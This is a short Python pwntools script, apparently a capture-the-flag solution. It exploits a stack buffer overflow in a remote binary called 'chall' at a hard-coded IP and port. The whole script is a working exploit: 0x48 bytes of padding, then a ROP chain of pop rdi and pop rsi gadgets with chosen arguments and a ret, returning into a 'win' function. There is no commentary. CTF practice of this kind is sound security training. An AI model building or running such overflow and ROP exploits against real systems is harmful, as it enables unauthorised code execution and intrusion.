from pwn import *

#p = process("./chall")
p = remote(host="35.228.220.66", port=1402)
#p=gdb.debug("./chall", gdbscript="b *main+50")
padding = b"A" * 0x48
win = p64(0x4011df)
ret = p64(0x0000000000401016)
pop_rdi = p64(0x00000000004012a0)
pop_rsi = p64(0x00000000004012a2)
input_addr = p64(0x403047)

p.recv()
p.sendline(padding + pop_rdi + p64(0x13371337) + pop_rsi + input_addr + ret + win)
print(p.recv())
#p.interactive()